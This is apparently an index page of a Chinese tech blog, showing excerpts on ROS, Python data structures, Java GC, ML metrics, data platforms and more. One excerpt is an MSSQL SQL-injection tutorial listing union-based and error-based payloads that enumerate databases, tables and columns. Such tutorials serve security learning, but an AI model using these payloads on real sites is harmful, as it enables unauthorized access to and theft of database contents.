大哥老王最近生意做得风生水起，心情非常的愉快，向阿银要烟，大哥等小弟阿银下楼买烟的同时，大哥同时在跟小姐姐玩的不亦乐乎。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9f3990daa37e76d1f6d63de184a33b6e/" rel="bookmark">
			测试ROS是否安装成功
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、CTRL+ALT+T打开终端（Termial），输入以下命令，初始化ROS环境：
roscore 成功打开后终端所示：
里面显示有ROS的版本，还有一些节点、端号等内容。
2、再打开一个新的终端（Termial），输入以下命令，弹出一个小乌龟窗口：
rosrun turtlesim turtlesim_node 3、出现一个小乌龟的LOGO后，再打开一个新的终端（Termial），输入以下命令
rosrun turtlesim turtle_teleop_key 然后，通过方向键控制小乌龟的移动
4、打开新的Termial，输入以下命令，可以查看ROS节点信息：
rosrun rqt_graph rqt_graph 如果能顺利进行到这一步，说明ROS安装成功了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1bc3ac6ce0d1c670eb7f3503193244a/" rel="bookmark">
			SQL注入漏洞（MSSQL注入）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上一篇把MSSQL中默认的三张表说了，所以对于数据的查询应该没有什么太大的问题了。所以这篇文章主要讲一讲MSSQL注入的几种方法。
联合注入 可以使用information_schema库，不过我个人是更喜欢MSSQL的那三张默认的表，查询如下，
查当前库： ?id=-1' union select 1,db_name(),3--+ 查所有库： ?id=-1' union select 1,db_name(),name from master.sysdatabases where name not in(select top 1 name from master.dbo.databases)--+ 查表： ?id=-1' union select top 1 1,2,table_name from master.sysobjects where xtype='U'--+ 查列： ?id=0' union select 1,name,3 from master.syscolumns where id=(select id from sysobjects where name='users')--+ 当然也可以用information_schema，感兴趣的自己可以在本机测试。
报错注入 MSSQL中的报错注入原理与MySQL报错注入的原理有些不太一样，由于MSSQL数据库是强类型语言数据库，当类型不一致时将会报错，而我们恰巧利用一个类型不一致的比较判断讲报错的敏感数据回显出来。payload如下，
查库： 1' and 1=(db_name())-- 或 1' and 1=(select db_name())-- 或 1' and 1=(convert(int,@@version))-- 1' and 1=(select top 1 name from sysdatabases)-- 1' and 1=(select top 1 name from sysdatabases where name not in('test'))-- 1' and 1=(select top 1 name from sysdatabases where name not in('test') and name not in('master'))-- 查表： 1' and 1=(select top 1 name from sysobjects where xtype='U') -- 1' and 1=(select top 1 name from sysobjects where xtype='U' and name not in('users')) 查列： 1' and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name='users')) convert()、cast()是强制转换的函数，如上如果强制转换失败再与整型作比较就会报错，而报错的内容会带出sql查询的结果。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c1bc3ac6ce0d1c670eb7f3503193244a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/504d3a9af4c0f55d86e35741a207759b/" rel="bookmark">
			「 WEB测试工程师 」岗位一面总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		近期企业外包类项目有一定的招聘需求，聊聊面试的感受以及分享一下初级测试工程师的面试过程
面试时间：07.04 14:00
1. 面试者介绍
个人基本信息
1.学历：统招全日制本科
2.工作年限：(可接受派遣)
3.当前状态：离职状态 (目前人在天门)
离职原因
之前一直在上海，从20年12月去实习，到今年7月份一直在上海，考虑离家近一点
从业经验
学校就读外派分配到上海测试实习岗位，一直从业至今年7月份
测试领域
功能测试为主（web测试接触较多、移动端测试涉及的少）接口测试、性能未涉及
工作主要职责
项目中功能测试角色，小组为单位(8人组全测试)完成领导分配的任务，过程涉及需求内部评审、用例评审(业务评审)、执行测试、提交缺陷、回归测试、完成验收、关闭工单、汇报结果
2. 综合分析
测试用例设计能力：良好
思维发散能力还可以，用例设计覆盖面较广。
缺陷分析能力：一般
更多是发现问题、反馈问题，极少的去分析问题、定位问题。
沟通能力：较强
沟通能力还可以，条例比较清晰、顺畅
自主性(项目流程建设与改进)：一般
在测试后期会在实际测试场景中，针对测试用例未覆盖的点，向产品提出补充性建议
学习能力：一般
平时下班以及工作中学习少，离职至今到现在也很少温习测试相关知识点，偶尔总结面试经验
ps：这里我个人不太理解，面试者也是很真实的说出了自己平时不怎么学习。切记有些东西不能太直白，会减分
总结：
软技能：沟通能力、思维能力还不错
硬技能：测试技能一般，未能体现个人技术亮点（学校分配工作到至今在工作中都是作为执行者按部就班的执行，缺少独立负责项目的经验）
综合素质：适应能力较强、抗压能力还行、真诚
3. WEB测试工程师一面面试题
1. 简单做一下自我介绍？
2. 简要介绍自己的项目/在其中担任的角色/工作概要内容
3. 那么请你以某个版本说说整体的流程，以及你这边如何开展测试工作的？
4. 说说你们公司项目的历程以及测试流程，在这些流程过程你这边有没有说觉得哪些地方不妥，给出一定的建议性的观点，简单说说？
5. 如果在指定时间内要上线，你这边测试时间不够你怎么做？
6. Sit、uat、生产代码发布的流程，以及上线流程
7. 测试用例设计方法？软件测试二八原则知道吗？
8. 现在wps给你公司一个单子？里面涉及到一个文件上传模块让你这边负责，进行设计下测试用例？
9. 现在wps给你公司一个单子？里面涉及到一个文件分享模块让你这边负责，进行设计下测试用例？
10. 订阅号文章分享这个功能，进行设计下测试用例？
11. 如何判断一个问题是不是bug？如果是怎么区分他是前端还是后端或其它配置类bug？
12. 使用过抓包工具吗？说下你这边的使用过程，知道它的工作原理吗？
13. HTTP请求GET和POST请求方式的区别？
14. 接口请求返回的状态码200、301、401、403、404、500、503分别都代表什么？
15. PC-WEB浏览器客户端如何模拟断网测试？
16.PC-WEB兼容性测试你这边一般是怎么做的？
17.做过接口测试吗？UI以及接口自动化呢？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/504d3a9af4c0f55d86e35741a207759b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b4026f4ce2e0c577801949f934dd70b7/" rel="bookmark">
			python实现数据结构--栈和队列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		栈和队列 一、栈 1.1 定义 ​ 栈式限制在一端进行插入和删除操作的线性表，具有先进后出的特性，如图所示：
1.2 基本概念 判断栈是否为空：$ node $ 为栈的头结点，若 n o d e node node 为空，返回 T r u e True True , 否则返回 F a l s e False False**入栈：**入栈即为在栈的顶部插入元素出栈： 出栈即为删除顶部的元素取出栈顶元素： 即为获取栈顶的元素 1.3 顺序栈 1、初始化 ​ 顺序栈在初始化时要定义栈的大小。设定 max 为栈的存储元素个数
栈为空时， self.top 的数值为 -1 ；栈为满时， self.top = max - 1 ​ 代码如下：
class SeqStack(object): def __init__(self, max): # 顺序栈的最大容量 self.max =max # 当栈为空时， 栈定指针指向 -1 self.top = -1 # 存储栈元素的数组 self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b4026f4ce2e0c577801949f934dd70b7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/61cf2a50fec638637966d451403b6baa/" rel="bookmark">
			python实现数据结构--线性表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		线性表 1 定义 线性表是由 n （ n &gt; = 0 ） n（n&gt;=0） n（n&gt;=0）个数据元素（节点） a 1 、 a 2 、 a 3 、 … 、 a n a1、a2、a3、…、an a1、a2、a3、…、an 成的有限序列。该序列中的所有节点都具有相同的数据类型。其中，数据元素的个数 n n n 称为线性表的长度。
当n=0时，称为空表。当n&gt;0时，为非空的线性表，记作(a1,a2,…,an)。
线性表的主要存储结构：
顺序存储结构：顺序表链式存储结构：单链表、双链表、循环链表 2 顺序表 定义：把线性表的节点按逻辑顺序依次存放在一组地址连续的存储单元中，用这种方法存储的线性表称为顺序表，即顺序存储的线性表。
特点：
线性表的逻辑顺序与物理顺序一致。数据元素之间的关系是以元素在计算机内“物理位置相邻”来体现的。可以直接根据存储单元的个数和大小计算出任意元素的存储地址。 基本操作 1. 初始化顺序表 ​ 初始化顺序表时先给顺序表分配内存空间，声明数组的最大容量。Python中实例对象初始化一般会用到 __init__()方法。代码实现如下：
def __init__(self, max): ''' 初始化 :paramma:顺序表最大容量 ''' sel.max = max sel.index = 0 self.data = [None for_ in range(self.max)] 2. 按下标值查找元素 ​ 通过下标值来查找元素，如果下标值合法，则返回该下标值上元素，否则抛出异常，代码实现如下。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/61cf2a50fec638637966d451403b6baa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91059e3ea42a04eac786c6845020751b/" rel="bookmark">
			这几年爆火的智能物联网（AIoT），到底前景如何？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者：郭斌 刘思聪 於志文
来源：大数据DT（ID：hzdashuju）
当前物联网、大数据和人工智能技术的快速发展与加速融合，催生出智能物联网（Artificial Intelligence of Things, AIoT）这一极具前景的新兴前沿领域。
其中，人工智能的模型和算法擅长从海量无序数据中发现规律、学习策略，而物联网则能为数以亿计的实体设备建立广泛连接。因此，人工智能与物联网两者的融合将发挥更强大的协同感知计算效力，但同时也将带来更多值得深入探索的问题和挑战。
01 物联网将持续增长并成为一种势头强劲的网络
预计2025年我国物联网连接节点将达到200亿个，将远远超过互联网主体（即人类用户）的数量。谷歌预测，到2025年世界将被IoT设备主导。因此，未来数百亿异构设备和用户并发联网产生的数据分析和融合需求将促成物联网与人工智能的深度融合。
与以人为中心的互联网不同，AIoT是把电子、通信、计算机、人工智能四大领域的技术融合起来的新型网络，在互联网连接的基础上进一步拓展，实现人与人、人与物、物与物以及人与环境的广泛互联，从而将传统“互联网”和“物联网”的连接范围和连接方式提升为“人、机、物”三类异构主体的联结共生和深度融合。
02 AIoT背景下的群智协同研究面临新的研究挑战
AIoT在架构和实现层面通常包括物理感知层、网络连接层、智能计算层和综合应用层。AIoT首先通过各种异构设备联网实时感知各类数据（环境数据、运行数据、业务数据、监测数据等），进而在终端设备、边缘设备或云端通过大数据挖掘或机器学习算法来进行处理、理解和认知，如智能感知、目标识别、能耗管理、预测预警、自动决策等。
近年来，智能物联网应用和服务已经逐步融入智慧城市、智能制造、无人驾驶等多个国家重大需求和民生领域。由于海量AIoT设备具有全天候、多层次的感知、计算、存储和通信能力，不仅能感知人和环境，而且能与人（群用户）、机（群应用）、物（群智体）交互以满足应用驱动的性能需求。
此外，在终端智能和云边端层次化资源控制等新兴技术的不断推动下，AIoT在感知、计算、通信和应用四个环节的整体联动都需要人、机、物之间有更深入的协作和互补。
因此，如何使群智能体以分布式协作的方式通过自组织、自适应和自学习增强演化，在AIoT全生命周期内实现群信息的优选汇聚和深度挖掘，并始终维持群应用总体性能与分布式资源能效间的权衡优化，已成为一个重要的科学问题。
03 AIoT分布式协同生态尚未成熟，但发展潜力巨大
微软、IBM、阿里巴巴、腾讯、华为、京东等企业近年来都积极在智能物联网领域布局。
2017年，谷歌逐步推出TensorFlow Lite框架支持深度模型压缩和硬件加速，Edge TPU、Coral Dev Board等硬件开发设备支持AIoT应用落地。微软在2019年度的开发者大会上发布AIoT的战略布局。
2018年，阿里巴巴宣布进军物联网领域，定位为物联网基础设施的搭建者，提供IoT连接和AI能力，实现云边端一体的协同计算，并开发了轻量级物联网嵌入式操作系统AliOS Things。
腾讯也推出了一款物联网系统TencentOS tiny，具有低功耗、低资源占用等特点。华为则推出了面向物联网的华为鸿蒙操作系统，作为一种基于微内核的全场景分布式操作系统，在5G时代具有广泛应用前景。
京东也于2018年发布“城市计算平台”，结合深度学习等构建时空关联模型及学习算法解决交通规划、火力发电、环境保护等城市不同场景下的智能应用问题。
然而，影响AIoT发展的阻碍因素之一是设备在计算资源（如算力、存储）、操作系统、算法框架等方面的异构性，而统一的AIoT感知计算范式尚未发展成熟。在此背景下，人机物如何以分布式互补增强或竞争对抗的方式实现协同感知、学习、计算和通信以完成复杂任务成为重要的研究方向。
本文摘编自《人机物融合群智计算》（ISBN：978-7-111-70591-8），经出版方授权发布。
延伸阅读《人机物融合群智计算》
点击上图了解及购买
转载请联系微信：DoctorData
推荐语：人类正在进入一个人机物三元融合的万物智能互联时代！人机物融合群智计算必将是下一个AI风口！人机物融合群智计算的恢弘巨著！
关于作者：郭斌，工学博士，西北工业大学计算机学院教授/博导，国家杰出青年科学基金获得者，国家“万人计划”青年拔尖人才，智能感知与计算工信部重点实验室副主任，西北工业大学计算与艺术交叉研究中心主任，陕西省高校青年创新团队负责人。
刘思聪，工学博士，西北工业大学计算机学院副教授。研究方向为普适计算、移动嵌入式智能、智能物联网。在ACM MobiSys、ACM Ubicomp、IEEE Transactions on Mobile Computing等高水平会议/期刊上发表论文20余篇，拥有授权专利4项。
於志文，西北工业大学教授、计算机学院院长，教育部“长江学者”特聘教授，国家杰出青年科学基金获得者，国家“万人计划”科技创新领军人才，国家重点研发专项项目首席科学家。
Java核心技术大会2022|李三红老师的专场分享回放现已上传至B站【Java核心技术站】。
https://www.bilibili.com/video/BV1Xr4y1M7nk
（长按复制至浏览器打开）
嘉宾分享PPT请点击下方链接获取
更多精彩回顾
资讯 |《Java核心技术》基于Java 17全面升级！ 干货 |再见了Java8，Java17：我要取代你 资讯 | Java核心技术大会2022 · 重磅发布 书单 |今天，Java27岁了！
新书 | 红蓝攻防：构建实战化网络安全防御体系
书讯 |7月书讯 | 12本新书如期而至！
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/91059e3ea42a04eac786c6845020751b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9c863404e21ad93b2f7bbcc6b7a52f92/" rel="bookmark">
			【Coppeliasim】C&#43;&#43; 读取Coppeliasim视觉传感器图像数据，winform显示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实验截图：C++读取传感器数据
实验截图：C++读取视觉传感器数据
实验视频
笔记：
一、传感器类：读取传感器数据
//传感器构造函数：类型，名 CoppeliaSensor::CoppeliaSensor(int type, string name) { sensor_type = type; sensor_name = name; } //初始化：获取传感器句柄 int CoppeliaSensor::init() { int ret = simxGetObjectHandle(clientID, sensor_name.c_str(), &amp;sensor_handle, simx_opmode_blocking); if (ret != simx_return_ok) return 0; if (sensor_handle != 0) { if (sensor_type == vision_sensor) { //视觉传感器：获取图像image simxGetVisionSensorImage(clientID, sensor_handle, resolution, &amp;image, 0, simx_opmode_streaming); } else if (sensor_type == proximity_sensor) {//接近传感器：获取状态数据 simxUChar state; float objPoint[3]; float objNorm[3]; int objHandle; simxReadProximitySensor(clientID, sensor_handle,&amp;state, objPoint, &amp;objHandle, objNorm, simx_opmode_streaming); } else if (sensor_type == force_sensor) {//力传感器：获取状态数据力和力矩 simxUChar state; float force[3], torque[3]; simxReadForceSensor(clientID, sensor_handle, &amp;state, force, torque, simx_opmode_streaming); } } else { printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9c863404e21ad93b2f7bbcc6b7a52f92/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa435740636b8fe5bf059c392a89abc7/" rel="bookmark">
			数据中台-架构、构建与体系建设
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据中台-架构、构建与体系建设 数据中台架构数据中台构建方法论技术体系数据体系服务体系运营体系 数据中台功能架构数据中台技术架构 企业构建数据中台评估统计分析阶段决策支持阶段数据驱动阶段运营优化阶段数据汇集-打破企业数据孤岛数据开发-提取数据价值 数据体系建设贴源数据层ODS(Operational Data Store)统一数仓层DW(Data Warehouse)标签数据层TDM(Tag Data Model)应用数据层ADS(Application Data Store)数据标签层如何构建数据标签层确定构建标签对象设计标签类目标签表实现 数据中台架构 数据中台要求全企业共用一个数据技术平台、共建数据体系、共享数据服务能力。实际上一个企业中由于各个业务线发展不均衡，各自都有独立的数据处理架构，导致共享数据非常困难，所以要构建数据中台不仅是对技术架构的改变，同时还是对整个企业业务运转模式的改变，需要企业在组织架构和资源方面给予支持。数据中台是一个企业战略行动，绝非一个项目组或者一个小团队就能做的，需要了解整个企业的业务情况，对业务进行梳理，还需要技术支撑、组织的支撑，否则很难推行下去。
数据中台构建方法论 数据中台的建设内容包含技术体系、数据体系、服务体系、运营体系四大体系。
技术体系 技术体系是构建数据中台的基础支撑，对于技术体系而言包括两部分：大数据存储计算技术和数据中台工具技术组件。
大数据存储计算技术包含：Hadoop、Spark、Flink、Clickhouse等技术，企业一般不会自己建设，只需要进行合理的选型即可。
数据中台工具技术包含：数据汇集、数据资产管理、平台服务管理工具等相关技术。
数据体系 数据体系是指全企业的数据通过各种方式汇聚到数据中台，在数据中台中按照一定的建模方式进行加工处理，形成企业的数据资产体系。不同企业业务不同对应的数据不同，当然构建的数据体系内容也不同，但是建设的方法都是类似的。
服务体系 数据中台与大数据平台最主要的区别是数据中台中数据能方便的以服务化的方式支撑业务。服务体系是通过中台的服务组件能力，把数据变为一种服务能力。例如：客户微观画像系统、信用评估服务、风险预警服务等，让数据能够方便的参与到业务中去并为业务带去价值。
运营体系 运营体系是数据中台的守护者，通过运营体系保证整个中台的健康、持续运转。运营体系包含平台资源占用监控、数据质量监控、数据价值评估等，其目标是让中台持续健康运转，产生持续价值。
结合以上构架数据中台四大体系，构建数据中台可分为如下5个步骤,如图所示：
1)理现状
梳理企业已拥有的数据、业务特点，使用的技术，部门等企业组织形态等现状。
2)立架构
架构中包含“组织架构”、“业务架构”、“技术架构”、“应用架构”、“数据架构”。
组织架构：组织架构主要是保证中台项目的顺利落地需要企业考虑的整体组织保障，其中角色主要包含：业务人员、IT人员、供应商、相关负责人。
业务架构：保证数据中台能够适用于企业业务的业务管理流程。
技术架构：主要针对数据中台中数据存储、计算相关技术选型。
应用架构：应用架构就是根据业务设计哪些数据服务。
3)建资产
数据资产建设包含数据汇集、数据仓库建设、数据治理、标签体系建设，其中最重要的就是标签体系建设，所谓标签体系建设就是面向具体对象构建的全维度数据标签，通过标签体系可以方便地支撑应用。
4)用数据
将通过数据中台构建的数据资产通过服务化的方式应用到具体的业务中，发挥数据价值。
5)做运营
运营主要包含数据监控审计、数据价值评估等内容，通过数据运营，让更多的人和业务感知到数据的价值。数据中台构建稳定之后，一般会循环3~5步骤，不断挖掘数据和业务场景的结合点。
由以上建设数据中台内容体系来看，建设数据中台除了有对应的方法论之外，还需要有对应的支撑技术、组织架构。“方法论”、“支撑技术”、“组织架构”实际上是建设数据中台的“三板斧”，缺少任何一个条件都不能建设好中台。
数据中台功能架构 数据中台总体架构图如下：
下面简述以上数据中台的各个部分，可以参照后续小节分析内容。
数据汇集
数据汇集是数据中台数据接入的入口，所有数据来自于业务系统、日志、文件、网络等，这些数据存储在不同的网络环境和存储平台，通过数据汇集工具可以将这些数据汇集到数据中台中。
数据开发
数据汇集到中台之后，数据都是按照原始状态堆砌在一起，业务无法使用，数据开发可以通过一整套数据加工及管理工具，将数据进行清洗处理。
数据体系
此部分主要是大数据平台中数据仓库构建内容。
数据资产管理
通过数据体系建立起来的数据资产较为偏技术，业务人员比较难理解，数据资产管理是以企业全员更好理解的方式把企业数据展现给全企业人员。数据资产管理包括对数据资产目录、元数据、数据质量、数据血缘、数据生命周期等进行管理和展示。
数据服务体系
数据服务体系就是把数据变为一种服务能力，通过数据服务让数据参与到业务，数据服务体系是数据中台存在的价值所在。数据中台服务提供快速的服务生成能力以及服务的管控、鉴权、计量等功能。
运营体系和安全管理
运营体系和安全管理是数据中台健康持续运转的基础。建设内容主要涉及企业资产管理和数据安全，使数据越用越多，越用越活。
数据中台技术架构 数据中台的技术架构如下：
企业构建数据中台评估 数据应用成熟度四个阶段
每个企业的发展情况不同，到底要不要构建数据中台？我们可以从企业数据应用的成熟度来评估企业要不要构建数据中台。数据应用能力成熟度可以总结为统计分析、决策支持、数据驱动、运营优化四个阶段，各自特点如下：
以上四个阶段数据应用能力成熟度依次增高，数据应用能力成熟度越高，则代表数据对业务的支撑能力越强，应用能力成熟度越低，则意味着业务对数据的依赖程度越低。企业数据应用能力程度越高构建数据中台越有价值，下面分别介绍四个阶段。
统计分析阶段 1979年Oracle发布商用数据库1.0版本、微软公司在1989年发布了SQL Server，1996年MySQL发布1.0版本，20世纪90年代随着UNIX服务器和x86服务器的普及，数据库解决方案进入市场，开始大火，数据库的建设成本和技术门槛大幅降低，越来越多的企业迈入IT信息化时代，实现生产和管理自动化的系统不只是大型企业考虑的问题，越来越多的中小型企业开始尝试利用信息系统来进行流程和管理优化，因此MRP（material requirement planning物料需求计划系统）、ERP（enterprise resource planning 企业资源计划平台）、CRM(Customer Relationship Management，客户关系管理)、OA（Office Automation，办公自动化）等企业管理系统的建设成为21世纪初企业信息化建设的一股热潮。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fa435740636b8fe5bf059c392a89abc7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/687fed8bf019eaeca54c38c7a6a13673/" rel="bookmark">
			生成二维码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		常用的二维码生成器hutool 可以生成各种格式的图片 按需调用 所谓的二维码 其实就是一个get请求的连接 所有内置方法都在QrCodeUtil中
简单介绍一下使用Base64的生成
@GetMapping("/getQRCode") public AjaxResult registrationQRCode() { return AjaxResult.success("操作成功", QrCodeUtil.generateAsBase64(String.format("跳转地址", "参数1", "参数2"), new QrConfig(), ImgUtil.IMAGE_TYPE_JPG)); } public static void ByteToFile(byte[] bytes) throws Exception { ByteArrayInputStream bais = new ByteArrayInputStream(bytes); BufferedImage bi1 = ImageIO.read(bais); try { File w2 = new File("D:\\img\\00000000003.jpg");//可以是jpg,png,gif格式 ImageIO.write(bi1, "jpg", w2);//不管输出什么格式图片，此处不需改动 } catch (IOException e) { e.printStackTrace(); } finally { bais.close(); } } public static void main(String[] args) { String s = QrCodeUtil.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/687fed8bf019eaeca54c38c7a6a13673/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b38faaf80cee03248fcd32ec3da5767a/" rel="bookmark">
			java回收算法学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		stop the word 暂停所有用户线程 判断垃圾对象 对象是否被引用 引用计数 可达性分析 原理 GC root对象向下搜索引用链,对象跟gcroot不存在引用链相连则作为垃圾对象 GCroot的范围 方法区中的静态变量，常量 本地方法引用的对象 java虚拟机栈的一些引用，如基本数据类型的class对象 同步锁的对象 反应虚拟机内部情况的对象 动态加入的GCROOT,如跨代引用的对象 引用 强引用 软引用 内存溢出时候回收，如果回收内存还不够，就会直接回收这些对象 弱引用 虚引用 虚拟机实现细节（加快垃圾收集，保证垃圾收集的正确） 根节点枚举 根节点枚举查找引用链是非常耗时的 在虚拟机加载运行过程中维护根节点枚举引用链集合oopmap,这样在回收的时候减少stop the world时间，也不需药每次都从方法区等根节点查找引用链 安全点 oopmap记录内容变化的特定位置 垃圾回收确定了引用关系，不会在回收完之后尽量少的又增加新增的垃圾数据， 抢断中断，主动中断 安全区域 被拉伸的安全点，理解为，在这个区域内OOPmap不会变化，程序不执行的时候，未给程序分配处理器时间 记忆集合 缩小gcroot的范围，非手机区域指向手机区域 不需要整个遍历老年代来确定引用链关系 记录跨代用用的内存块关系 特殊标识脏页，级存在快带引用的内存集合 写屏障 记忆集合变脏发生在赋值的那一刻 aop确立写屏障 伪共享 不采用无条件写屏障 当已经变脏就不去维护变化了 并发的可达性 缩短标记时间，并发的时候可以标记 三色：未被垃圾收集器方位，访问，且存在引用，访问，但还有被引用的的对象没进过垃圾收集器范文 回收算法 标记-清除 缺点：执行效率不稳定，当存在大量的数据对象时候，需要花费大量的时间进行标记跟清除 需要清除的对象内存地址并不是连续的物理内存地址，所以经过标记清楚算法之后，会产生大量的空间碎片，大量的空间碎片会导致后续在分配大对象时候，由于找不到连续的足够欧的内存来分配，而不得已进行fullgc CMS专属老年代算法 标记-复制 将存货的对象复制到内存的一边，然后直接清楚另外的内存 缺点;存在大量对象的时候，会复制大量的对象，所以适合亲声带 8：2，eden跟surrvivor，from to。 新生代算法，在标记复制期间都会暂停整个用户线程 有哪些算法 serwn new 穿行手机 praleel 收集器，并行 并行收集器 标记整理 将存活的对象整理到内存的一端，然后直接清楚另外一端的内存 有哪些算法 serwn old 穿行手机 rarallel old，并行 在整理过程中会暂停用户线程 stop the word 暂停所有用户线程 判断垃圾对象 对象是否被引用 引用计数 可达性分析 原理 GC root对象向下搜索引用链,对象跟gcroot不存在引用链相连则作为垃圾对象 GCroot的范围 方法区中的静态变量，常量 本地方法引用的对象 java虚拟机栈的一些引用，如基本数据类型的class对象 同步锁的对象 反应虚拟机内部情况的对象 动态加入的GCROOT,如跨代引用的对象 引用 强引用 软引用 内存溢出时候回收，如果回收内存还不够，就会直接回收这些对象 弱引用 虚引用 虚拟机实现细节（加快垃圾收集，保证垃圾收集的正确） 根节点枚举 根节点枚举查找引用链是非常耗时的 在虚拟机加载运行过程中维护根节点枚举引用链集合oopmap,这样在回收的时候减少stop the world时间，也不需药每次都从方法区等根节点查找引用链 安全点 oopmap记录内容变化的特定位置 垃圾回收确定了引用关系，不会在回收完之后尽量少的又增加新增的垃圾数据， 抢断中断，主动中断 安全区域 被拉伸的安全点，理解为，在这个区域内OOPmap不会变化，程序不执行的时候，未给程序分配处理器时间 记忆集合 缩小gcroot的范围，非手机区域指向手机区域 不需要整个遍历老年代来确定引用链关系 记录跨代用用的内存块关系 特殊标识脏页，级存在快带引用的内存集合 写屏障 记忆集合变脏发生在赋值的那一刻 aop确立写屏障 伪共享 不采用无条件写屏障 当已经变脏就不去维护变化了 并发的可达性 缩短标记时间，并发的时候可以标记 三色：未被垃圾收集器方位，访问，且存在引用，访问，但还有被引用的的对象没进过垃圾收集器范文 回收区域 minor GC（新生带) eden区不满 major Gc (老年代) 老年代不满 full GC(整个堆) system.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b38faaf80cee03248fcd32ec3da5767a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0057daeba757334e364452df8130268c/" rel="bookmark">
			机器学习分类问题指标评估内容详解（准确率、精准率、召回率、F1、ROC、AUC等）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、混淆矩阵（confusion matrix）二、准确率，精准率，召回率，F1分数1. 准确率（Accuracy）2. 精确率（Precision）3. 召回率（Recall）4. F1分数1. 概念2. 置信度（Confidence）3. F1曲线图判断 三、mAP、ROC、AUC1. 总体平均精确度：mAP（mean Average Precision）重叠度：Intersection over Union（IoU） 2. ROC（Receiver Operating Characteristic）TPR真正率（Sensitivity、True Positive Rate）FPR假正率（False Positive Rate） 3. AUC（Area Under roc Curve） （扩展：Yolov5 训练所生成的所有文件） 前言 入门机器学习分类问题，总有些内容是绕不过的，为了辨别模型好坏，必须要了解模型评估的各项指标。
为了能够加深记忆，本人在基于他人文章的基础下写了本篇博客，同时也方便自身查阅。
看懂机器学习指标：准确率、精准率、召回率、F1、ROC曲线、AUC曲线
什么是ROC曲线？为什么要使用ROC?以及 AUC的计算
一、混淆矩阵（confusion matrix） 二分类的在此不作介绍，此图为我最近训练的比较差的四分类模型（yolo5s-v6）所生成的混淆矩阵：
具体解释如下：
X横坐标为正确的分类（即你用标签所标注的真实分类）
Y纵坐标为模型所预测的分类（即图片经过模型推理后模型将其辨别为的分类）
举例，如S07_A_1：
该项分类的训练结果很差，有50%被认为是S07_A_2，另外50%则是S07_A_normal，也就是模型完全无法分辨出S07_A_1这项分类。
举例，如S07_A_3：
该项没有训练到任何分类数据，所以指标上一片空白。
还有 background FP和 background FN会比较难解释些：
这里先普及一下多分类下的TN、TP、FN、FP的概念：
True positives (TP): 缺陷的图片被正确识别成了缺陷。（本缺陷的正确分类预测）
True negatives(TN): 背景的图片被正确识别为背景。（非本缺陷被预测为其他分类缺陷或背景）
False positives(FP): 背景的图片被错误识别为缺陷。（非本缺陷被预测为本缺陷）
False negatives(FN): 缺陷的图片被错误识别为背景。（本缺陷被预测为其他缺陷或者背景）
举例，如background FP（背景的图片被错误识别为缺陷）：
100%在S07_A_normal的横坐标上，即100%的背景都被认为是S07_A_normal缺陷。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0057daeba757334e364452df8130268c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bfb958c208a95200936dcf2b5e46f1e1/" rel="bookmark">
			.net 5 FluentFTP连接FTP失败问题：This operation is only allowed using a successfully authenticated context
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景：测试环境下用FluentFTP连接FTP没问题，到客户那里连接不上了
问题分析：
1.看错误信息，是认证之类的，检查了FTP账号密码是没问题的
2.检查客户那边的FTP Server，是Sery-U搭建的，用客户端连接是可以的
3.那就是程序问题，怀疑是FluentFTP问题，但查看FluentFTP，是支持连接Serv-U的；因为不想更改程序内过多东西，于是开始分析FluentFTP使用问题
